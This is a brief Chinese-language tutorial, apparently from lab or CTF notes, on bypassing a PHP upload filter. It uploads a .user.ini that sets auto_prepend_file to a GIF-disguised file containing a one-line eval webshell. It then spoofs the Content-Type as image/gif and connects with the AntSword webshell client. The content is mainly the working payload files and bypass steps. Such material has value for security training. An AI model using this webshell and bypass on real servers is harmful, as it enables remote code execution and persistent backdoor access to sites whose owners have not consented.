![img](./assets/wps582.jpg)

借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。

 

新建一个.user.ini文件

 

![img](./assets/wps583.jpg) 

内容为：

GIF89a

auto_prepend_file=1.gif

 

新建一个1.gif文件

内容为

GIF89a

<?=eval($_REQUEST[c]);

?>

 

上传.user.ini文件

![img](./assets/wps584.jpg) 

修改

Content-Type: application/octet-stream

为

Content-Type: image/gif

成功上传

![img](./assets/wps585.jpg) 

接着上传1.gif 文件

蚁剑连接

![img](./assets/wps586.jpg) 

 

![img](./assets/wps587.jpg) 

 

 